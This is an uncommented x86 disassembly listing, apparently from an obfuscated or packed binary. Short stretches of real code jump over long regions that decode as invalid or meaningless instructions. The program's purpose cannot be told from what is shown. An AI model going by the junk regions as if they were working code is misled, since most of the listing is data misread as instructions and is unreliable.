  40bc36:	(bad)  
  40bc37:	out    dx,eax
  40bc38:	sub    DWORD PTR [edx-0x42],edx
  40bc3b:	mov    dh,BYTE PTR ds:0x74319ef4
  40bc41:	cmp    eax,0x993a2f
  40bc46:	inc    ecx
  40bc47:	add    eax,0x466fcb56
  40bc4c:	xchg   edx,eax
  40bc4d:	mov    ecx,0x9b325411
  40bc52:	mov    esp,0x9caf68c1
  40bc57:	jge    0x40bc55
  40bc59:	int    0x35
  40bc5b:	cmp    eax,DWORD PTR [edx+ebx*2+0x4b70fc8]
  40bc62:	js     0x40bbef
  40bc64:	dec    ebp
  40bc65:	in     al,dx
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	adc    DWORD PTR [edx-0x439913a],ecx
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	xchg   ebx,eax
  40bca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bca3:	cmp    al,0x44
  40bca5:	mul    DWORD PTR [esi-0x5b]
  40bca8:	lods   eax,DWORD PTR ds:[esi]
  40bca9:	hlt    
  40bcaa:	imul   esp,DWORD PTR [ecx-0x67],0xffffffe2
  40bcae:	add    al,0xee
  40bcb0:	rcl    DWORD PTR [edi+0x2b],0x76
  40bcb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcb5:	sbb    al,0x17
  40bcb7:	jmp    0x4aabbcaa
  40bcbc:	jnp    0x40bcab
  40bcbe:	fs loop 0x40bc43
  40bcc1:	popa   
  40bcc2:	aam    0x35
  40bcc4:	mov    esi,0x4ba36f47
  40bcc9:	retf   
  40bcca:	xchg   edx,eax
  40bccb:	test   eax,0xac960085
  40bcd0:	fstp   DWORD PTR [esi-0x58]
  40bcd3:	test   al,0x50
  40bcd5:	test   BYTE PTR [esi+0x299659c7],dh
  40bcdb:	xchg   esp,eax
  40bcdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcdd:	pop    eax
  40bcde:	pop    ebp
  40bcdf:	cmp    al,0x7b
  40bce1:	inc    ebx
  40bce2:	xchg   esi,eax
  40bce3:	xor    bl,cl
  40bce5:	ficom  DWORD PTR [esi]
  40bce7:	mov    dl,BYTE PTR [ecx]
  40bce9:	add    DWORD PTR [esi+0x3c],0xf7771c93
  40bcf0:	and    esp,DWORD PTR [eax+edi*1]
  40bcf3:	cwde   
  40bcf4:	xchg   esp,eax
  40bcf5:	jns    0x40bd64
  40bcf7:	dec    BYTE PTR [ebx+0x58]
  40bcfa:	cli    
  40bcfb:	mov    eax,0xaf3c422b
  40bd00:	jle    0x40bcff
  40bd02:	lds    eax,FWORD PTR [ecx-0x38]
  40bd05:	lods   al,BYTE PTR ds:[esi]
  40bd06:	pushf  
  40bd07:	jns    0x40bd81
  40bd09:	adc    eax,DWORD PTR ds:0xedca519f
  40bd0f:	adc    DWORD PTR [ecx],edx
  40bd11:	repnz xor cl,bl
  40bd14:	and    ch,bh
  40bd16:	dec    eax
  40bd17:	out    0x48,al
  40bd19:	mov    dh,0x64
  40bd1b:	cli    
  40bd1c:	xor    BYTE PTR [ecx],bh
  40bd1e:	push   cs
  40bd1f:	jmp    0xafdec987
  40bd24:	mov    esi,0xaf8f6f55
  40bd29:	ja     0x40bd5b
  40bd2b:	scas   eax,DWORD PTR es:[edi]
  40bd2c:	inc    ebx
  40bd2d:	dec    edx
  40bd2e:	popa   
  40bd2f:	push   eax
  40bd30:	sub    dh,BYTE PTR [eax+0x5e]
  40bd33:	fst    QWORD PTR [edx+0x21]
  40bd36:	lock push ss
  40bd38:	add    eax,0x40b223ab
  40bd3d:	or     cl,BYTE PTR [ebx+0x5d697502]
  40bd43:	lock or DWORD PTR [edi+0x333ac380],0x77feea0c
  40bd4e:	outs   dx,BYTE PTR ds:[esi]
  40bd4f:	and    dl,BYTE PTR [eax+esi*4-0x71189d20]
  40bd56:	add    al,0xfc
  40bd58:	es retf 
  40bd5a:	push   ecx
  40bd5b:	sbb    eax,0xdb58b92
  40bd60:	mov    DWORD PTR [ecx],eax
  40bd62:	test   esp,ebp
  40bd64:	mov    ebp,0xd89812db
  40bd69:	mov    cs,WORD PTR [edi+eax*8+0x2f]
  40bd6d:	cmp    DWORD PTR ds:0x80fa8b72,esi
  40bd73:	int    0xdf
  40bd75:	push   ds
  40bd76:	scas   eax,DWORD PTR es:[edi]
  40bd77:	ins    BYTE PTR es:[edi],dx
  40bd78:	stos   DWORD PTR es:[edi],eax
  40bd79:	mov    edx,DWORD PTR [edx]
  40bd7b:	jmp    0xc6f0:0xa01b8c7c
  40bd82:	ja     0x40bd89
  40bd84:	jno    0x40bd25
  40bd86:	push   ss
  40bd87:	jnp    0x40bde6
  40bd89:	mov    ds:0xda89bcf1,eax
  40bd8e:	jmp    0x40bd4a
  40bd90:	repnz mov cl,0xf3
  40bd93:	or     BYTE PTR [edx+0x46068cbe],dl
  40bd99:	punpckldq mm0,DWORD PTR [ebp-0x2473ad46]
  40bda0:	push   ds
  40bda1:	sub    BYTE PTR [ebp-0x779c3996],cl
  40bda7:	jns    0x40bdf1
  40bda9:	cli    
  40bdaa:	mov    esi,0xb0be6f1a
  40bdaf:	xor    cl,dl
  40bdb1:	cmc    
  40bdb2:	add    DWORD PTR [edi+0x47],edx
  40bdb5:	jmp    FWORD PTR [ebp-0x36283b16]
  40bdbb:	lds    ecx,FWORD PTR [esi-0x2b]
  40bdbe:	(bad)  
  40bdbf:	mov    ebx,0x88b75da1
  40bdc4:	and    eax,DWORD PTR [ebx+0x16]
  40bdc7:	lods   eax,DWORD PTR ds:[esi]
  40bdc8:	inc    edx
  40bdc9:	test   al,0xd0
  40bdcb:	xlat   BYTE PTR ds:[ebx]
  40bdcc:	adc    eax,0x5cf18246
  40bdd1:	or     cl,dl
  40bdd3:	adc    DWORD PTR [ebp+edx*4-0x4b],eax
  40bdd7:	add    dl,cl
  40bdd9:	imul   edx,DWORD PTR [ebx+0x3d3d3a75],0x1607806f
  40bde3:	xor    bl,ah
  40bde5:	inc    esp
  40bde6:	jns    0x40bd78
  40bde8:	xor    esi,DWORD PTR [eax]
  40bdea:	xchg   edx,eax
  40bdeb:	loopne 0x40be65
  40bded:	and    esp,DWORD PTR [ebx+0x68]
  40bdf0:	clc    
  40bdf1:	fld    QWORD PTR [esi]
  40bdf3:	rol    DWORD PTR [esi],1
  40bdf5:	outs   dx,DWORD PTR ds:[esi]
  40bdf6:	cmp    esi,DWORD PTR [edx+0x5add3c41]
  40bdfc:	int    0x71
  40bdfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdff:	scas   eax,DWORD PTR es:[edi]
  40be00:	jl     0x40bde2
  40be02:	mov    esp,0xac67e4b8
  40be07:	lea    ecx,[edx-0x60]
  40be0a:	fimul  DWORD PTR [ecx]
  40be0c:	sbb    BYTE PTR [ecx+0x200999d],al
  40be12:	mov    ah,dh
  40be14:	mov    ebx,0xcd88d839
  40be19:	es js  0x40bdba
  40be1c:	push   0xffffffcb
  40be1e:	pop    ds
  40be1f:	mov    esp,0x1e25d8a1
  40be24:	mov    edx,0x695ef377
  40be29:	aaa    
  40be2a:	or     edi,DWORD PTR [edi]
  40be2c:	sub    al,0x30
  40be2e:	mov    edi,ebx
  40be30:	loope  0x40be0f
  40be32:	jae    0x40be9f
  40be34:	or     eax,0x767225cc
  40be39:	pop    esp
  40be3a:	scas   eax,DWORD PTR es:[edi]
  40be3b:	mov    ds:0xdd65e374,eax
  40be40:	mov    dh,0x6d
  40be42:	jns    0x40bdff
  40be44:	inc    esi
  40be45:	retf   
  40be46:	rol    BYTE PTR [edx],1
  40be48:	add    al,0xbb
  40be4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be4b:	mov    ch,0xc3
  40be4d:	push   es
  40be4e:	or     edi,eax
  40be50:	mov    edi,gs
  40be52:	call   0xea29743c
  40be57:	gs cli 
  40be59:	and    BYTE PTR [eax+0x1b6238e8],ch
  40be5f:	xchg   edx,eax
  40be60:	cmp    DWORD PTR [edx+0x2a],0x277019e2
  40be67:	push   0xc09e5731
  40be6c:	in     eax,0xa1
  40be6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be6f:	in     eax,0x2b
  40be71:	or     eax,0x712c6732
  40be76:	add    BYTE PTR [esi-0x30],0x7f
  40be7a:	(bad)  
  40be7b:	sub    ch,BYTE PTR [ecx-0x7576fa4b]
  40be81:	hlt    
  40be82:	and    al,0x3b
  40be84:	not    DWORD PTR [eax+edx*8]
  40be87:	pop    ds
  40be88:	enter  0x15cb,0xc5
  40be8c:	lock push 0x5fa848f1
  40be92:	xor    BYTE PTR [esi+ebp*1-0x6ef1f1c5],0xa4
  40be9a:	repnz xor edi,DWORD PTR [bp-0x215b]
  40bea0:	ins    BYTE PTR es:[edi],dx
  40bea1:	xor    DWORD PTR [esi-0x2d],edx
  40bea4:	adc    al,0x20
  40bea6:	sbb    DWORD PTR [edx+ebx*2],edx
  40bea9:	(bad)  
  40beaa:	jne    0x40bf21
  40beac:	and    al,0xad
  40beae:	cwde   
  40beaf:	inc    eax
  40beb0:	shr    ebp,cl
  40beb2:	in     al,dx
  40beb3:	test   BYTE PTR [ebp+0xb9239f5],0x66
  40beba:	xchg   edi,eax
  40bebb:	inc    ecx
  40bebc:	jmp    0x40bf1d
  40bebe:	shl    ebp,0x18
  40bec1:	push   es
  40bec2:	pop    ecx
  40bec3:	mov    eax,0xeeb1357c
  40bec8:	add    edx,edi
  40beca:	mov    esi,0x611cccd9
  40becf:	xchg   esp,eax
  40bed0:	fs (bad) 
  40bed2:	sub    al,0xcb
  40bed4:	and    DWORD PTR [edx+0x77],eax
  40bed7:	repnz hlt 
  40bed9:	sar    DWORD PTR [eax],1
  40bedb:	and    BYTE PTR [ecx+ebp*2],dl
  40bede:	mov    BYTE PTR [edx],cl
  40bee0:	or     bl,BYTE PTR [esi+ecx*1]
  40bee3:	xchg   BYTE PTR [edi+0x46],bl
  40bee6:	cld    
  40bee7:	xor    eax,0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi+0x644a3431]
  40bf27:	dec    eax
  40bf28:	cmp    cl,0x7e
  40bf2b:	jle    0x40bf65
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf6b
  40bf31:	bound  esi,QWORD PTR [esi]
  40bf33:	jge    0x40bf9f
  40bf35:	(bad)  
  40bf36:	mov    cl,0xe2
  40bf38:	ret    
  40bf39:	stos   DWORD PTR es:[edi],eax
  40bf3a:	data16 daa 
  40bf3c:	test   ch,bl
  40bf3e:	pop    ss
  40bf3f:	jge    0x40bf6b
  40bf41:	jle    0x40bf39
  40bf43:	leave  
  40bf44:	sbb    eax,0xe7e0d62d
  40bf49:	pop    ds
  40bf4a:	push   ax
  40bf4c:	sbb    BYTE PTR ds:0x9c5b7cb1,0xf
  40bf53:	mov    edx,0xf78d967a
  40bf58:	sbb    eax,0xf128e568
  40bf5d:	arpl   WORD PTR [esi-0x70],di
  40bf60:	dec    esp
  40bf61:	xchg   ecx,eax
  40bf62:	mov    dl,0xc4
  40bf64:	inc    eax
  40bf65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf66:	push   cs
  40bf67:	mov    ds:0x6130f910,al
  40bf6c:	test   BYTE PTR [eax-0x75742de1],0xa8
  40bf73:	mov    ds:0xd380e00b,eax
  40bf78:	loop   0x40bfdb
  40bf7a:	fwait
  40bf7b:	das    
  40bf7c:	ret    
  40bf7d:	mov    esi,0x5a3395d6
  40bf82:	xchg   edi,eax
  40bf83:	cli    
  40bf84:	mov    dh,0xb2
  40bf86:	pushf  
  40bf87:	push   edx
  40bf88:	jle    0x40bfff
  40bf8a:	xchg   ebx,eax
  40bf8b:	paddusw mm5,QWORD PTR ds:0xc4d6172c
  40bf92:	inc    eax
  40bf93:	cld    
  40bf94:	pop    ds
  40bf95:	adc    ah,BYTE PTR [ebp+0x2e]
  40bf98:	(bad)  
  40bf99:	xor    DWORD PTR [edx-0x7e4b2ba2],edx
  40bf9f:	push   es
  40bfa0:	jecxz  0x40bffc
  40bfa2:	dec    eax
  40bfa3:	fdivr  DWORD PTR [ebx-0x6]
  40bfa6:	cmp    esi,DWORD PTR [eax+0x39]
  40bfa9:	cmp    al,BYTE PTR [edx]
  40bfab:	aad    0x23
  40bfad:	in     al,0x85
  40bfaf:	neg    DWORD PTR [ecx-0x4b1b2b3]
  40bfb5:	inc    esp
  40bfb6:	lock test BYTE PTR [eax-0x3bb976f0],cl
  40bfbd:	ds inc ebp
  40bfbf:	fwait
  40bfc0:	clc    
  40bfc1:	sahf   
  40bfc2:	arpl   WORD PTR [esi],di
  40bfc4:	push   ss
  40bfc5:	mov    ss,ebp
  40bfc7:	add    DWORD PTR [ebx+0x3219cacf],edi
  40bfcd:	dec    edi
  40bfce:	fisubr WORD PTR [edx+0x4c]
  40bfd1:	xchg   ebx,eax
  40bfd2:	jmp    0x40c03a
  40bfd4:	out    dx,al
  40bfd5:	and    edi,DWORD PTR [edx]
  40bfd7:	sub    al,0x31
  40bfd9:	call   0xc8a0:0xe65ab5fa
  40bfe0:	sbb    DWORD PTR [edx+0x51],ecx
  40bfe3:	pop    ebx
  40bfe4:	inc    eax
  40bfe5:	dec    edx
  40bfe6:	out    0xd,al
  40bfe8:	daa    
  40bfe9:	cdq    
  40bfea:	outs   dx,DWORD PTR ds:[esi]
  40bfeb:	mov    eax,0x9752e615
  40bff0:	add    al,0x81
  40bff2:	shr    BYTE PTR [ebx-0x6e],1
  40bff5:	sub    DWORD PTR [edx],esi
  40bff7:	mov    ds:0x9683e169,al
  40bffc:	inc    esp
  40bffd:	sub    eax,0x67d6ef9d
  40c002:	fidiv  WORD PTR [ebx-0x2349538c]
  40c008:	test   al,0xc7
  40c00a:	mov    bh,0x2f
  40c00c:	xchg   esi,eax
  40c00d:	rcl    BYTE PTR [edx-0x475ec654],cl
  40c013:	les    ebx,FWORD PTR [edx-0x3e267c53]
  40c019:	sub    DWORD PTR [edi],edi
  40c01b:	xchg   ebp,eax
  40c01c:	or     cl,BYTE PTR [edi*1+0x59a100ad]
  40c023:	repnz xchg edi,eax
  40c025:	dec    eax
  40c026:	adc    eax,0x7e11043b
  40c02b:	jb     0x40c0a5
  40c02d:	loopne 0x40c077
  40c02f:	dec    ecx
  40c030:	mov    eax,0xaf57cc97
  40c035:	mov    al,ds:0xbfebf10c
  40c03a:	pop    es
  40c03b:	mov    al,ds:0xe77f795c
  40c040:	fwait
  40c041:	push   ebx
  40c042:	fild   QWORD PTR [ebp+0x5a]
  40c045:	sub    di,bp
  40c048:	xor    al,0xfb
  40c04a:	sub    dh,BYTE PTR ds:0x1bdf161d
  40c050:	stc    
  40c051:	xchg   ebp,eax
  40c052:	test   bl,ch
  40c054:	xor    eax,0x4c2ee9d1
  40c059:	xor    al,0x72
  40c05b:	mov    esi,0x28ea8381
  40c060:	pop    ds
  40c061:	clc    
  40c062:	ss aad 0xa6
  40c065:	outs   dx,DWORD PTR ds:[esi]
  40c066:	in     al,dx
  40c067:	jecxz  0x40c03d
  40c069:	iret   
  40c06a:	mov    ds:0x56b2a4ba,eax
  40c06f:	ror    bh,0x76
  40c072:	loop   0x40c0aa
  40c074:	pop    ecx
  40c075:	mov    dh,0xe1
  40c077:	add    DWORD PTR [ecx-0x7a],ecx
  40c07a:	call   0x5eaf:0xb285e39a
  40c081:	aaa    
  40c082:	popa   
  40c083:	xor    eax,0x568e7062
  40c088:	pop    ecx
  40c089:	lahf   
  40c08a:	mov    bl,0x3d
  40c08c:	icebp  
  40c08d:	push   cs
  40c08e:	cmp    edx,DWORD PTR [ebx+eiz*8]
  40c091:	imul   eax,DWORD PTR [ecx+0x3fcf8261],0xfffffff7
  40c098:	add    bl,0xc5
  40c09b:	stos   BYTE PTR es:[edi],al
  40c09c:	bound  ebx,QWORD PTR [esp+ebp*2-0x58ae3b61]
  40c0a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0a4:	cmp    esp,DWORD PTR [edi+0x78]
  40c0a7:	add    eax,0xb4ed0b89
  40c0ac:	fwait
  40c0ad:	and    eax,0x63d596f8
  40c0b2:	jl     0x40c072
  40c0b4:	cmp    al,0xce
  40c0b6:	dec    ebx
  40c0b7:	arpl   WORD PTR [eax+edi*1],cx
  40c0ba:	gs in  eax,dx
  40c0bc:	add    eax,0xe0098936
  40c0c1:	xchg   esi,eax
  40c0c2:	lea    edx,[esi]
  40c0c4:	xor    eax,ebp
  40c0c6:	aaa    
  40c0c7:	int3   
  40c0c8:	dec    ecx
  40c0c9:	inc    edx
  40c0ca:	mov    gs,WORD PTR [ecx-0x7cc926dd]
  40c0d0:	iret   
  40c0d1:	xor    eax,0x7cb356ac
  40c0d6:	repz add BYTE PTR [ebp+0x791ecba3],dh
  40c0dd:	fcmovnbe st,st(2)
  40c0df:	scas   eax,DWORD PTR es:[edi]
  40c0e0:	nop
  40c0e1:	ins    DWORD PTR es:[edi],dx
  40c0e2:	bnd jb 0x40c149
  40c0e5:	dec    eax
  40c0e6:	xor    bh,BYTE PTR [esi-0x12]
  40c0e9:	iret   
  40c0ea:	jno    0x40c118
  40c0ec:	out    0xb3,al
  40c0ee:	or     al,0x9c
  40c0f0:	or     dh,cl
  40c0f2:	xor    eax,0xa834fe84
  40c0f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0f8:	mov    BYTE PTR [ebx+0x1f5b0879],bl
  40c0fe:	push   cs
  40c0ff:	imul   ebx,DWORD PTR [ecx+eiz*8],0x8bf956b5
  40c106:	daa    
  40c107:	jge    0x40c17c
  40c109:	call   FWORD PTR [ecx+ebx*8]
  40c10c:	in     al,dx
  40c10d:	mov    eax,ds:0xd7685676
  40c112:	es pusha 
  40c114:	stc    
  40c115:	inc    edi
  40c116:	fist   DWORD PTR [esi-0x1f]
  40c119:	js     0x40c0e2
  40c11b:	jnp    0x40c18d
  40c11d:	or     bl,BYTE PTR [esi]
  40c11f:	xlat   BYTE PTR ds:[ebx]
  40c120:	(bad)  [esi+0x7b6b97e2]
  40c126:	aad    0x5e
  40c128:	stos   DWORD PTR es:[edi],eax
  40c129:	pop    edi
  40c12a:	add    DWORD PTR [esi-0x4c],edx
  40c12d:	xchg   edx,eax
  40c12e:	fisttp WORD PTR [edx-0x80]
  40c131:	xlat   BYTE PTR ds:[ebx]
  40c132:	mov    ds:0x353c979d,eax
  40c137:	ins    BYTE PTR es:[edi],dx
  40c138:	jecxz  0x40c159
  40c13a:	and    esp,ebx
  40c13c:	mul    DWORD PTR [eax+ebx*4-0x79afc1e9]
  40c143:	enter  0x5b6a,0xe
  40c147:	leave  
  40c148:	xor    BYTE PTR [edi-0x4bd6d2dd],0x59
  40c14f:	jecxz  0x40c141
  40c151:	push   es
  40c152:	dec    ebp
  40c153:	mov    edi,0x89e6a52a
  40c158:	(bad)  
  40c159:	mov    edi,0x3ff58f9c
  40c15e:	scas   eax,DWORD PTR es:[edi]
  40c15f:	mov    BYTE PTR [ebx],ch
  40c161:	addr16 ds dec esp
  40c164:	(bad)  
  40c165:	mov    edi,0x3e7dec0a
  40c16a:	inc    DWORD PTR [edx-0x3ee83234]
  40c170:	mov    esp,0x78f0b288
  40c175:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c176:	xchg   ebx,ecx
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xbf
  40c196:	mov    ds:0x874a1e2a,eax
  40c19b:	jle    0x40c21b
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	mov    ecx,0x238c0d2d
  40c1a6:	enter  0x24e4,0xc8
  40c1aa:	xor    al,0x36
  40c1ac:	leave  
  40c1ad:	jecxz  0x40c142
  40c1af:	or     BYTE PTR [ecx],dl
  40c1b1:	xor    BYTE PTR [ebx-0x4d],ch
  40c1b4:	jo     0x40c183
  40c1b6:	mov    ebx,0x41477c6d
  40c1bb:	cmp    BYTE PTR ds:0x6cabd8e4,al
  40c1c1:	(bad)  
  40c1c2:	or     DWORD PTR [edi-0x7ea1cd7f],edi
  40c1c8:	rcl    BYTE PTR [edx+ecx*8],cl
  40c1cb:	pop    esi
  40c1cc:	push   edi
  40c1cd:	mov    al,ds:0x6eb0cfab
  40c1d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1d3:	inc    edx
  40c1d4:	adc    al,0xb3
  40c1d6:	pop    esp
  40c1d7:	ffreep st(2)
  40c1d9:	lock xor BYTE PTR [ebp+0x1a717084],ah
  40c1e0:	xor    DWORD PTR [eax-0x3a],0x1e9070a1
  40c1e7:	xchg   ebx,eax
  40c1e8:	fmul   DWORD PTR [ebx+0x11]
  40c1eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1ec:	jp     0x40c1b5
  40c1ee:	mov    edx,0x4973e1dc
  40c1f3:	cs dec esp
  40c1f5:	repnz mov ds:0x4de4fcf0,al
  40c1fb:	repnz sub bh,al
  40c1fe:	ja     0x40c210
  40c200:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c201:	jmp    0x40c240
  40c203:	inc    eax
  40c204:	inc    esp
  40c205:	mov    ds:0x17a1cd12,al
  40c20a:	push   edx
  40c20b:	retf   0x38eb
  40c20e:	jp     0x40c1ae
  40c210:	clc    
  40c211:	mov    eax,0x77821e3a
  40c216:	sub    eax,DWORD PTR [edi]
  40c218:	sbb    ecx,DWORD PTR [bp+di+0x24]
  40c21c:	and    ebp,ebx
  40c21e:	push   ebp
  40c21f:	imul   edx,DWORD PTR [edx+0x6d],0xffffffad
  40c223:	mov    edi,0xa5dfbeb5
  40c228:	mov    dh,0x17
  40c22a:	cld    
  40c22b:	ss out dx,eax
  40c22d:	in     eax,dx
  40c22e:	sub    esp,eax
  40c230:	push   ebp
  40c231:	ja     0x40c246
  40c233:	mov    ds:0xddf7f309,al
  40c238:	push   cs
  40c239:	cld    
  40c23a:	push   ebx
  40c23b:	test   BYTE PTR [ebp+0x7f],cl
  40c23e:	inc    esp
  40c23f:	xor    al,0x1
  40c241:	xlat   BYTE PTR ds:[ebx]
  40c242:	cdq    
  40c243:	pop    esi
  40c244:	jmp    0x86af633d
  40c249:	adc    al,0xa
  40c24b:	mov    WORD PTR [edx-0x57],cs
  40c24e:	(bad)  
  40c24f:	mov    al,ss:0x361629e6
  40c255:	aas    
  40c256:	dec    ecx
  40c257:	dec    ebx
  40c258:	loope  0x40c24a
  40c25a:	and    al,0x60
  40c25c:	aas    
  40c25d:	jno    0x40c20a
  40c25f:	xor    dh,BYTE PTR [edi-0x71]
  40c262:	(bad)  
  40c263:	aaa    
  40c264:	fisub  DWORD PTR [ebx]
  40c266:	pop    ebx
  40c267:	stos   DWORD PTR es:[edi],eax
  40c268:	jmp    DWORD PTR [eax-0x39]
  40c26b:	or     al,0x22
  40c26d:	sar    DWORD PTR [ecx+0x7d028529],0xe1
  40c274:	fs push 0x801a5272
  40c27a:	mov    ds:0x150eab2d,al
  40c27f:	jbe    0x40c2b8
  40c281:	lahf   
  40c282:	or     al,0x31
  40c284:	xlat   BYTE PTR ds:[ebx]
  40c286:	cs div esi
  40c289:	in     al,0x47
  40c28b:	ss in  al,0x83
  40c28e:	fs push 0xa1d2bb23
  40c294:	iret   
  40c295:	je     0x40c264
  40c297:	in     eax,dx
  40c298:	mov    edx,0x83f42519
  40c29d:	sbb    dh,dh
  40c29f:	adc    eax,0x391cb481
  40c2a4:	popa   
  40c2a5:	dec    esi
  40c2a6:	dec    ecx
  40c2a7:	mov    ?,WORD PTR [esi-0x567e35d4]
  40c2ad:	jecxz  0x40c275
  40c2af:	repnz push 0x22
  40c2b2:	cmp    ebx,DWORD PTR [ebx-0x4b]
  40c2b5:	lock mov edi,0x3c70b3c1
  40c2bb:	mov    edi,DWORD PTR [edi-0x55ae8674]
  40c2c1:	xor    BYTE PTR [eax],cl
  40c2c3:	mov    ds:0xa717cef1,eax
  40c2c8:	sub    DWORD PTR [edi],esi
  40c2ca:	push   ebx
  40c2cb:	inc    ebx
  40c2cc:	shrd   DWORD PTR [ecx+0x14c5da07],eax,cl
  40c2d3:	jg     0x40c2b7
  40c2d5:	and    edi,DWORD PTR [ecx+0x4d]
  40c2d8:	sbb    bl,BYTE PTR [ebx+0x54]
  40c2db:	(bad)  
  40c2dc:	push   0xffffffff
  40c2de:	stos   DWORD PTR es:[edi],eax
  40c2df:	gs xor bl,bl
  40c2e2:	je     0x40c2ea
  40c2e4:	rcl    DWORD PTR [eax],0x14
  40c2e7:	jb     0x40c2dd
  40c2e9:	or     ebp,DWORD PTR [edi+0x13f1a6f]
  40c2ef:	adc    al,0x23
  40c2f2:	es mov ecx,0x73480b3d
  40c2f8:	mov    dl,0xb7
  40c2fa:	lahf   
  40c2fb:	pop    es
  40c2fc:	cli    
  40c2fd:	xchg   esi,eax
  40c2fe:	xor    al,dl
  40c300:	jg     0x40c2b9
  40c302:	and    BYTE PTR [esi-0x5479be2d],ch
  40c308:	out    0xa1,eax
  40c30a:	scas   al,BYTE PTR es:[edi]
  40c30b:	hlt    
  40c30c:	(bad)  
  40c30d:	(bad)  [ebx-0x613b8d2c]
  40c313:	pushf  
  40c314:	push   esi
  40c315:	mov    DWORD PTR ds:0xa006f471,esp
  40c31b:	xor    eax,0x466b65c5
  40c320:	xor    dh,BYTE PTR [esp+edi*4]
  40c323:	mov    al,0x6d
  40c325:	sub    esp,DWORD PTR [ebx-0x3d1083ce]
  40c32b:	loop   0x40c2d7
  40c32d:	fnstenv [edx]
  40c32f:	xor    ch,al
  40c331:	leave  
  40c332:	mov    DWORD PTR es:[ebp+0x79],ecx
  40c336:	int    0xa1
  40c338:	fdiv   DWORD PTR [edx+ecx*1-0x4d]
  40c33c:	xor    eax,DWORD PTR [edi]
  40c33e:	mov    dh,0x79
  40c340:	cdq    
  40c341:	fdiv   QWORD PTR [ebx]
  40c343:	out    dx,eax
  40c344:	in     eax,dx
  40c345:	lea    ecx,[edx-0x3c]
  40c348:	clc    
  40c349:	jl     0x40c33e
  40c34b:	push   ss
  40c34c:	sti    
  40c34d:	sbb    BYTE PTR [edi+0x9],ah
  40c350:	lea    esp,[ebp+0x54]
  40c353:	or     BYTE PTR [esp+ebp*2+0x23],ch
  40c357:	pushf  
  40c358:	aad    0x77
  40c35a:	push   ebx
  40c35b:	sbb    al,0xfd
  40c35d:	mov    WORD PTR [eax],es
  40c35f:	dec    ebx
  40c360:	(bad)  
  40c361:	fisub  DWORD PTR [ebp+0x6729d03f]
  40c367:	jle    0x40c355
  40c369:	mov    edi,0x40961b47
  40c36e:	push   edi
  40c36f:	loopne 0x40c377
  40c371:	daa    
  40c372:	retf   0x36ce
  40c375:	xor    edx,DWORD PTR [ebp-0x12]
  40c378:	int3   
  40c379:	push   ecx
  40c37a:	repz mov ebx,0xd61ee5c8
  40c380:	xor    dh,al
  40c382:	rcr    BYTE PTR [edx+eax*4+0x44],0xd5
  40c387:	mov    ebx,0x8ed0b886
  40c38c:	cs test al,0x91
  40c38f:	adc    BYTE PTR [edi+0x6418a7d7],bl
  40c395:	mov    bh,0xd7
  40c397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c398:	xlat   BYTE PTR ds:[ebx]
  40c399:	lods   eax,DWORD PTR ds:[esi]
  40c39a:	mov    al,ds:0xb25b7c62
  40c39f:	mov    ebx,0xd63dcc44
  40c3a4:	aam    0xbe
  40c3a6:	mov    cl,0xdc
  40c3a8:	push   ebp
  40c3a9:	sbb    dl,dh
  40c3ab:	in     eax,dx
  40c3ac:	mov    esp,0xad980770
  40c3b1:	imul   esi,eax,0x58
  40c3b4:	es or  al,0x8
  40c3b8:	dec    eax
  40c3b9:	test   BYTE PTR [edx+0x18],al
  40c3bc:	pusha  
  40c3bd:	jg     0x40c402
